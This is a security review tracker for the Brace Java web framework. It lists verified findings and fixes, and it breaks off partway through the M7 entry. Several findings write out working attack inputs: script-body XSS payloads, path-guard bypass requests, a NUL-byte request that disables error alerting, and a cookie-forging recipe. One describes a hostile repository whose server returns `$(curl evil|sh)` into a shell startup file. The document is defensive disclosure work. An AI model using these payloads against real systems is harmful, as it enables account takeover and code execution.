# Security Review Todos: 2026-11-09

Findings from a full-codebase security review of Brace at `1e28c0f`, which is `v0.1.11-rc.6` plus
one `TODO.md`-only commit, so the code reviewed is rc.6. This is the fourth security review under
the [periodic model review process](reviews/README.md), run with Fable 5.2. The earlier ones are
[2026-06](reviews/2026-06-security-fable-5.md), [2026-07](reviews/2026-07-security-opus-5.md) and
[2026-10](reviews/2026-10-security-opus-5-5.md).

**Framing.** The 2026-10 review moved most protections from per-handler to structural. This one
looked for what is still wrong after it: bypasses of those fixes, regressions they introduced, and
the surfaces around the structural core that the earlier reviews did not push on (static mappings,
the rate limiter, the error store, a hostile checkout driving the CLI).

**Scope.**

- Framework source (`src/main/java/com/larvalabs/brace`), read in full by area.
- The `bin/brace` launcher, `install.sh`, `brace-cli.sh`, CI workflows and scripts.
- The project `brace new` generates (`ProjectGenerator.java`).
- `docs/SECURITY.md` where a finding touched it.

Not read line by line: `BuildCommands.java` beyond its process-spawn sites,
`ClaudeMdGenerator.java`, parts of `CliCheck.java`, and `mvnw` itself (only the wrapper
properties). Not audited: every code sample in `BRACE-AGENTS.md` and `README.md`, and any app
built on Brace.

**Attackers considered.** An anonymous web client; a logged-in app user; the holder of a
read-scoped ops key; a hostile cloned repo or pull request driving the CLI; a network attacker
between the app and a relay; someone with write access to the shared database.

**Verification.**

- Five parallel reviewers each read one area in full. Every High and Medium was then confirmed
  a second time by reading the code at the cited lines (and the `v0.1.10` tag for H2).
- The request-path findings (M1 to M4, L3, L4, L9) were reproduced on a scratch server against
  Jetty 12.0.40. The template findings (H1, L7) were reproduced on a scratch harness against
  JTE 3.2.1, in both String and binary-static-content modes. M8 was reproduced on JDK 21. L1 and
  M6 were run against a scratch compile of `OpsKeys`, `OpsScope` and `Redactor`.
- **Nothing was run against a live Postgres.** M5 and L5 rest on reading the code plus pgjdbc
  42.7.14's client-side rejection of NUL bytes in string parameters ("Zero bytes may not occur in
  string parameters"). H2's test tier accepts NUL and cannot see them. The first step of the M5
  fix is a Postgres IT that proves it.
- H2 (the launcher) was traced by reading; no old toolchain was downloaded or run.
- Suspicions that could not be confirmed are under "Not confirmed"; re-checked areas that hold up
  are under "Checked and cleared".

**Tooling.** SpotBugs + find-sec-bugs, Semgrep and the OSV gate were **not rerun** for this
review. The fix plan's closeout phase reruns them.

**Fix plan.** Tracks, model assignments, open decisions and the merge gate are in
[`2026-11-09-security-review-fix-plan.md`](2026-11-09-security-review-fix-plan.md). This file is
the canonical tracker: tick a box in the commit that fixes it.

**Model.** Each item names the suggested model for the fix, sized by how subtle it is: Haiku 5.5
or Sonnet 5.5 for mechanical, well-specified changes; Opus 5.5 for multi-file changes with
judgment; Fable 5.2 where an invariant, a public API or a default changes.

## Summary

| # | Category | Verdict | Note |
|---|---|---|---|
| 1 | Authorization | **Structural for routes; missing for static mappings** | Routes, WebSocket upgrades and SSE are deny-by-default with access bound to the route. Static mappings sit outside the model, and the path guards that are the only way to gate them are bypassable two ways (M1 to M3). |
| 2 | XSS | **Structural in attributes; regressed in script bodies** | URL attributes, `on*`/`hx-on*`, `srcdoc` and `@template` in attributes held against every probe. The class that does it also catches JavaScript assignments inside `<script>` and downgrades their escaping (H1). Smaller gaps in L7. |
| 3 | SQL injection | **Structural** | Every dynamic SQL site was enumerated and is safe. LISTEN uses a validated, quoted, hash-derived channel name; `pg_notify` is parameterized; no room, cache key or job name reaches a channel. |
| 4 | CSRF | **Structural** | All four mutating verbs, constant-time masked tokens, never from the query string, no method override, `Origin: null` refused. One hardening item on the htmx helper (L8). |
| 5 | Path traversal | **Structural** | Static serving and `UploadedFile.safeFilename`/`saveTo` held against `..`, encoded forms, symlinks and dotfiles. |
| 6 | SSRF | **Structural** | The `Http` guard blocked every address range and host-parsing differential tried, checks all resolved addresses and never follows redirects. Residue: no body timeout (M8). |
| 7 | Command injection | **Structural in Java; one gap in the launcher** | Every process spawn is an argv list. The launcher's toolchain floor still admits CLIs with a known file-write bug (H2); smaller CLI items in L11. |
| 8 | Sessions and crypto | **Structural** | AES-GCM with random nonces, expiry inside the ciphertext, no decryption oracle, validator on every decode path. One misconfiguration trap (M7). |
| 9 | Rate limiting | **Per-handler, and the docs are wrong** | A missing key skips the limiter and the docs say the opposite (M4). Control characters and key cardinality are unhandled (L5, L6). |
| 10 | Information exposure and ops | **Mostly structural** | Generic errors and redacted messages. Header and query redaction in the error store is by name only (M6); a NUL can stall the store (M5). |

**Counts:** 2 High, 9 Medium, 16 Low.

## High

- [x] **H1: User data in `<script>var a = "${x}"</script>` gets HTML escaping, not JavaScript escaping**, `BraceHtmlOutput.java:61-62, 90, 137-152, 217-220, 247-268, 274-278`
  - **What's wrong.**
    - `OPENS_VALUE` (`\s(name)\s*=\s*"[^"]*$`) is matched against all static template text, not
      only text inside a tag. JavaScript such as `var a = "`, `const name = '` or `let u = "`
      matches, so a "held attribute value" named `a` is opened inside the script body.
    - JTE then calls `setContext("script", null)`. `setContext` returns early when the attribute
      name is null (`:90`), so the hold survives.
    - `writeUserContent` sees `valueAttribute != null && attributeName == null` (`:217`, `:274`)
      and sends the value to `appendToHeldValue`, which ends in `Escape.htmlAttribute`. That
      escapes only `' " & <`; backslashes and newlines pass through. The branch assumes "no
      attribute context" means a `@template` call inside an attribute, and a script body has the
      same shape.
    - This is a regression from the 2026-10 attribute work (M4/M5 and the `@template` review
      fix). It contradicts that review's cleared item "`<script>` contexts are JS-escaped".
  - **Verified (scratch harness).**
    - `<script>var a = "${x}", b = "${y}";</script>` with `x=\` and `y=;alert(1)//` renders
      `<script>var a = "\", b = ";alert(1)//";</script>`, and the alert runs.
    - `<script>const name = '${x}';</script>` with `x=a'b"c\d` renders `'a&#39;b&#34;c\d'`:
      wrong escaping and corrupted data.
    - `<script>foo("${x}");</script>` (no `=` before the quote) takes JTE's path and is
      correctly escaped.
    - The hold can also be opened by body text before the script:
      `<p>it's a = "5</p><script>var q = '${x}', r = '${y}';</script>`.
  - **Attack.** Stored or reflected XSS wherever a template has two interpolations in one script
    statement (or uses one value twice): a trailing `\` in the first swallows its closing quote
    and the second is then code. A single interpolation gives a script-block syntax error (a
    trailing `\` or a raw newline), which is a stored break of the page's inline JavaScript.
    Variables named `src`, `href`, `data` or `action` also go through the URL check, so
    legitimate values are replaced with `about:invalid#blocked`.
  - **Fix.**
    - Never hold a value while inside a `<script>` or `<style>` body. In both `writeUserContent`
      overloads, when `attributeName == null` and `tagName` is `script` or `style`
      (case-insensitive), flush any held value and delegate to `super`.
    - Preferably also stop `writeStatic` opening a hold in the first place while the output is
      in a raw-text element, so the hold never exists there.
  - **Tests.** `BraceHtmlOutputTest` has no script-body cases today. Add: `var a = "${x}"`,
    `const a = '${x}'`, two interpolations on one line, with `\`, `"`, `'`, newline and
    `</script>` as values, in both String and binary modes; the body-text-then-script case; and
    a check that attribute handling inside tags is unchanged.
  - **Model: Fable 5.2.** The class is a state machine across JTE callbacks, and this bug came
    from the last change to it.
  - **Review fixes.** The fix replaced the pattern with an HTML tokenizer over all template
    text. An independent review rendered about 110 templates through the old and new class,
    fuzzed the chunking and checked in a browser. Its findings, each with a failing test first:
    - **F1** (`4912bcb`, medium, a regression in the fix). `<svg><script href="/a.js"/></svg>`
      was read as the start of a script body that ran to the next `</script>` on the page, so
      no URL value was held and `href="${x}"` after it passed `javascript:`. Foreign content
      is now tracked (elements open inside `<svg>`/`<math>`, integration points, breakout
      tags, CDATA): a self-closing `<script/>`/`<style/>` there is complete, and one with a
      body is markup. And disagreement between JTE's context and the tokenizer now resolves
      to the stricter of the two: JTE's attribute rules (URL check included) apply even when
      the tokenizer believes it is in a script body. Follow-up `911ba6a` applies the same rule
      to data appended to a held value, and adds a seeded fuzz over every tokenizer state.
      Not modelled, and read as HTML (the side that keeps every rule on): an end tag that
      matches nothing open inside the `<svg>`, `<font>` without attributes, integration-point
      names under the other root, `<annotation-xml>` whatever its encoding.
    - **F2** (`a6d6864`, low to medium). In a script wrapped in `<!-- -->` that contains
      `<script`, the browser does not end the element at the first `</script>`. The tokenizer
      now has the script-data escaped and double-escaped states.
    - **F3** (`2da49bf`, low, older than the fix). Data in `<svg><script>var a="${x}"` could
      break out with `<img onerror=...>`, since an SVG script is tokenized as markup. `< > &`
      are now `\uXXXX` in every script body, and quotes too in a script in foreign content.
    - **F5** (`5b2d638`, nit). Data written in the middle of a match (`</scr${x}ipt>`) was
      skipped over; it now ends the match.
    - (F4 is under L7.)
    - Regression corpus: `src/test/resources/xss-corpus.txt` (`BraceHtmlCorpusTest`).
  - **Final review fixes.** The final whole-branch review rendered real templates through JTE
    3.2.1 in both static-content modes and confirmed execution in Chromium. Each with a failing
    test first, and the fixed output loaded in a browser again (no handler fires, values read
    back).
    - **M1** (`1991622`, medium; F3 was incomplete). In a script or style body inside
      `<svg>`/`<math>`, `0<i ?` or `a<b &&` opens a tag, and a string that does not follow `=`
      is in attribute-name position: `<svg><script>var n = 0<i ? "${x}" : "";</script></svg>`
      rendered an `<i>` with attacker-chosen attributes. The tokenizer knew it was inside a tag;
      the data got script escaping only. Data written while the tokenizer is inside a tag and
      not in a quoted value (or straight after `<` or `</`) now has every character written as
      an escape, letters and digits included (`\uXXXX`, or CSS hex escapes in a style), whatever
      JTE reports. It joins the "stricter reading wins" invariant.
    - **L1, L3 and the reviewer's recommendation** (`0f8bdc0`). Script-body data is no longer
      JTE's escaping plus `< > &`: everything but ASCII letters, digits, `_`, `,` and non-ASCII
      is `\uXXXX`, in HTML and foreign scripts alike. JTE's `\'`, `\-`, `` \` `` and `\$` broke
      `JSON.parse` of a JSON script block (L3), and its `\"` still ended a pseudo-attribute when
      the browser read the script as markup and the tokenizer did not (L1, a regression against
      the base commit). A regex literal now matches the data literally. Script attributes keep
      their lighter escaping.
    - **`<font>`** (`b74e20e`). Ends foreign content only with a `color`, `face` or `size`
      attribute, as in the HTML parser; an SVG font definition no longer desyncs the tokenizer.
    - **JTE drops template text** (corpus, `c2b68c4`). The probe whose script began
      `// <![CDATA[` lost its first and last lines in JTE, not in this class: JTE strips
      script comments, and JTE 3.2.1 also drops ALL the text before a template's first
      comment when the text after it has a `<letter` still open at the next `${...}`
      (`<script>` included, so the script source becomes body text and `i<n;` a real tag with
      data in attribute-name position: executes before M1, inert after). Documented in
      `docs/SECURITY.md`; worth reporting upstream.
    - Not modelled, and listed as residual: `<annotation-xml>` by its `encoding`, integration
      point names under the other root, an end tag that matches nothing open in the `<svg>`.
      With the tokenizer wrong there, script data is still escaped whole, so what is left is a
      letters-only value in attribute-name position (a boolean attribute such as `hidden`),
      and only where the template wrote whitespace before it inside the string.

- [ ] **H2: The launcher's toolchain floor still admits CLIs with the token-cache symlink write**, `bin/brace:77, 79-87, 96-97, 164-183`
  - **What's wrong.**
    - `MIN_TOOLCHAIN="0.1.8"`. Its comment says "Raise this when a release fixes a CLI-side
      security bug", and 0.1.11 fixes two (the token cache moved out of `target/`, and
      `SecretFiles` stopped writing through links), but the floor was not raised.
    - `version_lt` ignores any `-SUFFIX`, so `0.1.11-rc.1` to `rc.5`, which have the old code,
      would pass a floor of `0.1.11`.
    - At `v0.1.10`, `CliAuth.writeCache` does
      `SecretFiles.writeStringWithOwnerOnlyPermissions(target.resolve(".brace-token"), json)` and
      `SecretFiles` is a plain `Files.writeString(path, content)`, which follows symlinks. The
      `token` and `expiresAt` in that JSON come straight from the server's `/ops/auth` response.
      `v0.1.8`, `v0.1.9` and `v0.1.11-rc.1` to `rc.5` have the same code.
    - Smaller: `pinned_version` (`:96-97`) takes the last textual
      `<brace.version>…</brace.version>` in `pom.xml`, so a pin inside an XML comment or profile
      selects the CLI toolchain while Maven and a reviewer see another value.
  - **Attack.** A repo or pull request contains `<brace.version>0.1.10</brace.version>`, a
    `.brace` with `ops.prod.url=https://evil.example`, its own valid `ops-private.key`, and a
    committed symlink `target/.brace-token -> ../../.zshrc`. A developer, CI job or agent runs
    `brace status` or `brace check`, which is expected to be safe in an untrusted checkout. The
    launcher fetches 0.1.10; its CLI authenticates to the attacker's server, which answers
    `{"token":"$(curl evil|sh)","expiresAt":"2099-01-01T00:00:00Z"}`; the CLI writes that JSON
    through the symlink. Jackson does not escape `$(`, so the next shell that sources the file
    runs the command. Any other user-writable file can be clobbered the same way.
  - **Fix.**
    - Set `MIN_TOOLCHAIN` to `0.1.11` in the 0.1.11 release.
    - Make the floor comparison suffix-aware: a prerelease of the floor version is older than
      the floor, so every `0.1.11` prerelease is refused (decision D5 in the fix plan).
    - `pinned_version`: refuse a pom with more than one `<brace.version>` match.
    - Add a release-checklist line to `AGENTS.md`: "Did this release fix a CLI-side security
      bug? Raise `MIN_TOOLCHAIN`."
  - **Tests.** `tests/cli`: a pin of `0.1.10` is refused; `0.1.11-rc.1` is refused; `0.1.11` is
    accepted; `BRACE_ALLOW_OLD_TOOLCHAIN=1` still overrides; a pom with two pins is refused.
  - **Model: Opus 5.5.** Bash 3.2 constraints, and an off-by-one reopens the hole.
  - **Status (Track B, first commit): partly landed; the floor value waits for the 0.1.11
    release commit.**
    - Landed: `version_lt` is SemVer-ordered (a prerelease, `-SNAPSHOT` included, is older than
      its release; numeric parts compared as digit strings, so no overflow); the launcher's
      bundled toolchain is exempt from the floor; `pinned_version` refuses a pom with more than
      one `<brace.version>` element (comments, profiles, attributes and split tags counted);
      the `AGENTS.md` release-checklist line; `tests/cli/test-pinned-version.sh` covers every
      listed test against a launcher copy with the floor at 0.1.11, and passes with the shipped
      value at either 0.1.8 or 0.1.11.
    - Remaining: set `MIN_TOOLCHAIN="0.1.11"` in the release commit, then tick this box. Not
      earlier: until 0.1.11 exists, a 0.1.11 floor refuses every 0.1.11 prerelease that is not
      the bundled one, newer ones included (an rc.7 launcher would refuse a project pinned to
      rc.8), and a local `mvn package` build, labelled 0.1.10, would refuse every rc-pinned
      project.

## Medium

- [x] **M1: Static mapping prefix has no segment boundary**, `BraceHandler.java:1337-1344`, `Assets.java:108-110`
  - **What's wrong.** `serveStaticFile` tests `requestPath.startsWith(prefix)` and strips the
    prefix, so `/filesX` is treated as `/files` + `X`. `Middleware.PathPattern.matches`
    (`Middleware.java:82-87`) requires `path.equals("/files") || path.startsWith("/files/")`,
    so the two disagree. `Assets.resolve` has the same unbounded `startsWith`.
  - **Verified (scratch server).** With `staticFiles("/files", dir)` and
    `before("/files/*", guard)`: `GET /files/private/secret.txt` returns 403 and
    `GET /filesprivate/secret.txt` returns 200 with the file.
  - **Attack.** Any path-scoped guard on a static mapping, in the app or at a reverse proxy
    (`location /files/ { auth_request … }`), is skipped by one request. Every file in the
    directory is reachable.
  - **Fix.** In both places, require the request path to equal the prefix or to continue with
    `/` (or the prefix to end in `/`); otherwise `continue`.
  - **Tests.** `/filesX` and `/filesprivate/a` return 404; `/files/a` is served; a prefix
    registered with a trailing slash still works.
  - **Model: Sonnet 5.5.**

- [x] **M2: Path guards see the raw path; static serving decodes it afterwards**, `BraceHandler.java:335-341, 369-384, 1351`
  - **What's wrong.** Before-middleware and session middleware match the raw request path. The
    static handler then calls `Route.decodePath(relativePath)`. This is the normalization
    mismatch the 2026-10 route fix removed, still present for static mappings.
  - **Verified (scratch server).** With `before("/files/private/*", guard)`,
    `GET /files/%70rivate/secret.txt` returns 200 with the file (403 unencoded). `%70` is not an
    ambiguous URI, so Jetty passes it. On case-insensitive volumes (macOS, Windows)
    `GET /files/PRIVATE/secret.txt` also returns 200, because `toRealPath()` resolves case.
  - **Attack.** As M1, for a guard on a sub-path. A path-scoped `after(...)` (a
    `Cache-Control: private` header, for example) is skipped the same way.
  - **Fix.** In `serveStaticFile`, return 404 for a request whose decoded path differs from the
    raw path in unreserved characters (a canonical request never percent-encodes those), and
    404 when the real path differs from the requested path in case.
  - **Tests.** `%70rivate` returns 404; `my%20file.css` is still served; the case variant
    returns 404 on a case-insensitive volume (assume-guarded).
  - **Model: Opus 5.5.** The rule has to match the route fix and not break legitimate encoding.
  - **Review fixes.** A trailing slash was a second spelling that still served the file
    (`GET /files/exact.txt/` returned 200 past `before("/files/exact.txt", ...)`), because
    `Path.normalize()` drops the trailing separator. The static handler now returns 404 unless
    the path it would open, rendered with `/`, equals the requested relative path exactly (no
    trailing slash, no empty segment). The comment claiming safety under relaxed Jetty URI
    compliance now says what each check covers. Tests in `StaticCanonicalPathTest`, including
    the non-ASCII hex-digit case the reviewer's mutation check found unpinned.

- [x] **M3: Static mappings are outside deny-by-default, and the docs don't say so**, `BraceHandler.java:351-362, 390-396`, `Brace.java` (`staticFiles`), `docs/SECURITY.md` (Authorization, Static Files)
  - **What's wrong.** Access runs only `if (match != null)`; static files are served when
    `match == null`. `staticFiles(...)` takes no access argument. `docs/SECURITY.md` says plain
    `before(...)` never counts as access, so the only way to gate a mapping is a path `before`,
    which M1 and M2 bypass.
  - **Verified (scratch server).** With `defaultAccess(Access.session("userId","/login"))` and
    `staticFiles("/uploads", dir, StaticFiles.UNTRUSTED)`: anonymous `GET /secret` returns 302,
    anonymous `GET /uploads/<name>` returns 200.
  - **Attack.** An app that requires login everywhere serves every uploaded file to anyone who
    can guess or enumerate a name.
  - **Fix.** Decision D1 in the fix plan, decided: a mapping takes an `Access` or an explicit
    public marker, `start()` refuses one with neither, and the check runs in `serveStaticFile`
    with the same session instance. Either way, state in `docs/SECURITY.md` and
    `BRACE-AGENTS.md` how a mapping's access is decided, and that private files can also go
    through a route with `Result.fileUnder(...)`.
  - **Tests.** Startup refusal for an unmarked mapping; a session-guarded mapping rejects
    anonymous requests in every path variant from M1 and M2; `/ops/routes` and the startup
    banner show the mapping's access.
  - **Model: Fable 5.2.** A public API and a startup invariant every app changes for.
  - **Review fixes.** An independent review reproduced four gaps in the first fix; all fixed,
    tests in `StaticMappingReviewFixesTest`.
    - *Method bypass (Medium).* A non-GET/HEAD request found no route for its method and was
      served the mapping's file, around a route registered at that path with stricter access.
      A mapping now serves only GET and HEAD (405 otherwise, after its access) and never serves
      a path any route pattern matches; `start()` warns about routes under a mapping's prefix.
    - *Shared-cacheable guarded responses (Medium).* The `public`→`private` rewrite missed a
      lowercase header name, `s-maxage`, bare `max-age`, `Expires` and the CDN headers, and
      left the 404/416/rejection with no `Cache-Control`. Every caching header is now stripped
      (any case) under a guarded mapping and one is set: `private, no-cache` for the file,
      `no-store` otherwise. `Result` header names are case-insensitive, and a session cookie
      always rides `private`.
    - *Cacheable route rejections (Low).* Any access rejection is now `no-store` with
      `Vary: Accept, HX-Request`; dev mode warns when a guarded route's success is `public`.
    - *Directory checks (Low).* `start()` refuses overlapping directories with different
      access (not only guarded versus public) and a mapping whose directory is missing;
      a duplicate prefix throws; at serve time a file inside a differently guarded mapping's
      real directory is a 404.
    - *Access value equality (from the Track C limits review).* The overlap check compared
      requirements by identity, so two separate `Access.session("userId", "/login")` calls on
      overlapping directories were refused with a confusing message. The built-in kinds
      (session, none, `insteadOfDefault`) now have value equality; custom checks and the ops
      requirement stay identity; the message says so. Tests in `StaticMappingReviewFixesTest`.
    - **Final review fixes.** L-I: the dot-segment 404 for a path that falls under a guarded
      mapping (as written or with its dot segments resolved) is `no-store`. A WebSocket route
      owns its path under a mapping (a plain request for it was served the mapping's file); it
      is listed in the startup warning. A path a route owns, requested under another method,
      runs every owning route's access before the 405, so `Allow` is not shown to a caller the
      route refuses (a socket path answers 426 to a plain GET). `Cache-Control` is parsed into
      directives, quoted-string aware, by one helper used wherever it is read or rewritten
      (`x="no-store"` no longer counts as `no-store`). `Result.header(name, value)` requires an
      RFC 9110 token and names compare by ASCII case only. A mapping prefix must start with `/`.
      Docs: what "before the body is read" covers, where the static 405 sits, and the
      dot-segment 404 and after-middleware. Tests in `StaticMappingFinalReviewTest`.

- [x] **M4: `RateLimiter.perKey` is skipped when the key is null or blank, and the docs say the opposite**, `RateLimiter.java:196-198`, `Request.java:621-627`, `docs/SECURITY.md:1187-1190, 1208-1209`
  - **What's wrong.**
    - `check()` returns `null` (not limited) for a null or blank key. The Javadoc calls this
      intentional; `docs/SECURITY.md` says such requests go to a `"(none)"` bucket "rather than
      silently bypassing the limiter".
    - `Request.form()` fills missing fields from the query string (`params.putIfAbsent`), while
      `formParam()` reads the body only. The limiter and the handler can therefore see different
      values for the same field.
    - Keys are not trimmed or case-folded, so `Victim` and `victim ` are separate buckets.
    - Doc bug: `docs/SECURITY.md:1187, 1190` show `app.before("/api", RateLimiter.perIp(...))`,
      which limits only the literal `/api`.
  - **Verified (scratch server, limit 2).**
    - Documented login setup `perKey(req -> req.formParam("username"), …)` with a handler using
      `req.form(LoginForm.class)`: four `POST /login?username=victim` requests with only
      `password=…` in the body all returned 200 and bound `username=victim`.
    - Documented API setup `perKey(req -> req.header("Authorization"), …)`: four requests with
      no `Authorization` header all returned 200.
  - **Attack.** Unlimited password guessing against the documented login limiter; unlimited
    anonymous traffic against the documented API limiter.
  - **Fix.** Decisions D2 and D3 in the fix plan, decided: bucket null and blank keys
    together by default with an explicit opt-in for the exemption; stop `form()` taking body
    fields from the query string on mutating methods; correct both doc passages.
  - **Tests.** Missing key is limited by default and exempt with the opt-in; `form()` on a POST
    ignores a query-string value for a field absent from the body; GET forms still bind from
    the query.
  - **Model: Opus 5.5.** Two breaking semantics plus docs and a migration entry.
  - **Review fixes.** Decision A: the one global missing-key bucket let ordinary traffic lock
    everyone out (five keyless `GET /login` views from five addresses and the sixth visitor got
    429). A missing key is now counted in a per-address bucket (`" (none):" + ipBucket(ip)`, out
    of a client key's reach) with the limiter's limit and window, so keyless traffic is limited
    exactly as `perIp` would; `.exemptMissingKey()` is unchanged. Dev mode warns once per limiter
    when it counts a keyless GET/HEAD. Tests in `RateLimiterReviewFixesTest`.

- [x] **M5: One request containing `%00` stops error persistence and regression alerts on Postgres**, `ErrorStore.java:100-133, 141-204, 228-256`, `BraceHandler.java:586-626`, `Request.java:158-207, 289, 326-330`
  - **Confirmed on Postgres 16 (fix commit).** `ErrorStorePostgresIT` against the unfixed code:
    a batch holding one entry with a NUL stored zero rows, including the healthy kind beside it.
    An over-long `type` or `route` (over 255 characters; the route starts with the client's
    HTTP method) failed the batch the same way, so that second trigger is real at the store
    level. Whether Jetty lets such a method through is still not traced. The fix replaces NUL
    with U+FFFD rather than deleting it: the message arrives already redacted, and deleting
    would join two short tokens into one secret-shaped one.
  - **What's wrong.**
    - `Request.scanPairs` decodes with `URLDecoder.decode`, so `%00` becomes `\u0000` in query
      and form values. The typed accessors (`queryInt`, `queryLong`, `formInt`, …) are bare
      `Integer.parseInt`/`Long.parseLong`, whose exception message embeds the raw input.
    - `BraceHandler` passes the redacted message and stack trace to `errorStore.record`.
      Nothing strips control characters.
    - `flush()` upserts every pending kind in one transaction. pgjdbc rejects a NUL in a string
      parameter client-side. The catch block rolls back and merges the whole batch back,
      including the poisoned entry, so every later flush fails the same way. Nothing is logged.
  - **Verified.** By reading only; see Verification above. Not confirmed: whether Jetty lets
    `%00` through in a path segment (the `longPathParam` variant); the query and form variants
    do not depend on Jetty. A possible second trigger, an over-long HTTP method overflowing
    `route VARCHAR(255)`, was not traced.
  - **Attack.** An unauthenticated client sends `GET /anything?page=1%00` to any route that
    calls `req.queryInt("page")` or similar. From then on no error kind reaches `ops_errors`,
    `RegressionListener.onNew` never fires (it requires a commit), and after 1,000 pending kinds
    new ones are dropped. The attacker probes other bugs with alerting dead until restart.
    `Log.error` and in-memory stats still work.
  - **Fix.**
    - In `record()`, strip `\u0000` from every string and clip `type` and `route` to 255.
    - Isolate each upsert (savepoint or its own transaction) so one bad row cannot fail a batch.
    - Drop an entry after N failed flushes, and log flush failures (rate-limited).
  - **Tests.** A Postgres IT (`*IT`) with a NUL in the message: the row is stored, and other
    kinds in the same batch are stored. A unit test that a permanently failing entry is dropped
    and logged.
  - **Model: Opus 5.5.**
  - **Review fixes** (`fix(security): M5 review fixes`). A row error in a connection-classed
    SQLState (57014 and the like) on a connection that still passes `isValid` counts against the
    row instead of retaining the batch; a rejected row is retried once with its payload stripped
    (fixed placeholder message) so the count and regression signal survive.
  - **Final review fixes** (`fix(security): M5 final review fixes`). L9: only a data-class
    rejection (22xxx, 23xxx, 54xxx) is retried stripped, and the stripped write only adds the
    count to an existing row, so a lock timeout followed by a successful retry no longer
    replaces stored details with the placeholder. L10: a server-wide SQLState (25006 read-only,
    53xxx, 57P0x, 58xxx, 08xxx) aborts the flush and keeps the batch uncounted whatever
    `isValid` says, and so does a batch of two or more rows all failing with one non-data
    SQLState; a single poisoned row beside healthy ones is still counted and dropped. Unit tests
    in `ErrorStoreTest`; `ErrorStorePostgresIT` gains a read-only transaction window
    (`SET TRANSACTION READ ONLY`) and a real 55P03 lock timeout.

- [x] **M6: Error-store redaction of headers and query strings is by name only**, `BraceHandler.java:599-600, 1693-1704`, `Redactor.java` (`redact`, `redactQuery`, `SENSITIVE`)
  - **What's wrong.** `captureRedactedHeaders` runs `Redactor.redact(headers)`, which matches
    header names. `redactQuery` matches parameter names, without URL-decoding them. The
    value-shaped pass (`isSecretShaped`, the JWT shape) runs on the path and the exception
    message, never on header or query values.
  - **Verified (scratch compile of `Redactor`).**
    - `Referer: https://app.example.com/reset?token=a3f9…` is stored verbatim, as is the path
      form `/reset/<token>` inside a Referer.
    - `Cf-Access-Jwt-Assertion: eyJ…`, `X-Amzn-Oidc-Data: eyJ…` and `X-Auth-Key: …` are stored
      verbatim.
    - `redactQuery("code=4/0AX…&t=<32 chars>&sig=…&%74oken=abc")` comes back unchanged.
  - **Attack.** A user submits the reset form reached from `/reset?token=T` and the POST
    throws. The row in `ops_errors.request_headers` holds `Referer` with `T`. A holder of a
    `scope:read` key, the kind meant for autonomous agents, reads it from
    `GET /ops/errors?include=detail` and takes over the account. An OAuth callback `?code=…`
    that fails during the exchange stores an unconsumed code the same way.
  - **Fix.**
    - Run `redactMessage` over each surviving header value.
    - For URL-valued headers (`Referer`, `Origin`, `X-Original-URL`, `X-Forwarded-Uri`), apply
      `redactPath` and `redactQuery`.
    - In `redactQuery`, URL-decode the name before `isSensitive`, and redact any value where
      `isSecretShaped` is true.
    - Add `jwt`, `assertion`, `signature`, `otp` and `code` to `SENSITIVE`.
  - **Tests.** Each probe case above; a set of ordinary headers and queries that must survive
    unredacted (false positives are the risk here).
  - **Model: Opus 5.5.**
  - **Done** (`fix(security): M6 value-shaped redaction for error-store headers and query
    strings`). `Redactor.redactHeaders`: sensitive name, then URL-valued headers (`Referer`,
    `Origin`, `Location`, `Content-Location`, `X-Original-URL`, `X-Forwarded-Uri`,
    `X-Rewrite-URL`, `HX-Current-URL`) through `redactUrl` (path, query, fragment, userinfo),
    protocol-metadata headers kept verbatim (`Accept*`, `Content-Type`, `User-Agent`, ETags,
    `X-Forwarded-*`, request ids and trace context, `Sec-Fetch-*`/`Sec-Ch-*`), everything else
    through the value-shaped pass. `redactQuery` decodes names leniently and redacts values by
    shape (raw and decoded, nested URLs included). New names: `jwt`, `assertion`, `signature`,
    `authkey`, `nonce` as substrings; `code`, `sig`, `otp` as the whole normalized name only.
    Tables of must-survive and must-redact values in `RedactorTest`; end to end in
    `ErrorStoreTest.secretBearingHeadersAndQueryValuesAreRedactedInStoredError`.
  - **Final review fixes** (`fix(security): M6 final review fixes: …`). One free-form pass
    (`Redactor.redactText`) for messages, header values, path segments and query values:
    every `scheme://…` (any scheme, `jdbc:postgresql://` too), `<…>` and `uri=/…` goes through
    `redactUrl` (userinfo always masked), sensitive `name=value` pairs lose their value up to
    the next delimiter (no longer the next name), and every run of `[A-Za-z0-9_\-+/.~$%]` is
    tested label by label (16+, a digit and a letter, not a UUID or short path), decoded up to
    3 rounds; Java qualified names and hostnames with a common TLD are kept. `redactPath` checks
    decoded and `;matrix` segments. `Forwarded` and `Via` left the verbatim list. Names match by
    segment (`auth_code`, `verificationCode`, `passcode`; in transit also `pin`, `sid`,
    `ticket`, `session`, `X-Auth`), and the short words no longer hit log fields or route
    params (`isSensitive` vs `isSensitiveField`). `redact(Map)` is bounded at 64 levels and
    100,000 values. Cost: a 16+ character hash label in a file name is redacted; a short path
    (`/var/app/releases/20241105`) is no longer. Tables in `RedactorTest`, end to end in
    `ErrorStoreTest.finalReviewSecretsDoNotReachTheStoreOrTheLogs`.

- [x] **M7: `previousSecrets(...)` accepts the public scaffold placeholder**, `SessionOptions.java:157-165`, `Brace.java:268-273, 356-379`, `Session.java:317-328, 397-398`, `docs/migrations/brace-0.1.10-to-0.1.11.md:633`
  - **What's wrong.** `Brace.sessions(SessionOptions)` runs `validateSecret` on the current
    secret only. `previousSecrets` checks length alone, and the shipped placeholder
    `CHANGE-ME-to-a-random-string-at-least-32-chars` is 46 characters. `Session.fromCookie`
    opens any cookie sealed with a previous secret and re-seals it under the current one; `_abs`
    is optional on read.
  - **Attack.** An old-scaffold app upgrades, hits the startup refusal, and to avoid logging
    users out follows the migration guide's `previousSecrets(oldSecret)` recipe with the
    placeholder. An attacker derives the key locally (PBKDF2, salt `brace-session`, 100k
    iterations), seals `{"userId":"1","_exp":"<future>"}`, sends it as the session cookie, and
    receives a cookie sealed with the real secret. The same holds for any secret rotated
    because it leaked: while listed, it mints fresh cookies indefinitely. Needs that operator
    mistake; the guide points toward it.
  - **Fix.**
    - Run every previous secret through the `SHIPPED_PLACEHOLDER_SECRETS` refusal.
    - Reject a previous-secret cookie with no `_abs`, or whose `_abs` is beyond now plus the
      absolute lifetime, so a listed secret cannot mint past the configured lifetime.
    - State in `docs/SECURITY.md` (Secret rotation) and the migration guide that a public or
      compromised secret must never be listed.
  - **Tests.** Startup refuses a placeholder previous secret; a previous-secret cookie without
    `_abs` is rejected; ordinary rotation still works.
  - **Model: Sonnet 5.5.**
  - **Review fixes** (`fix(security): M7 review fixes`). An empty previous-secret cookie opens as
    a brand-new session (no inherited `_abs`); `sessions(options)` snapshots the options and
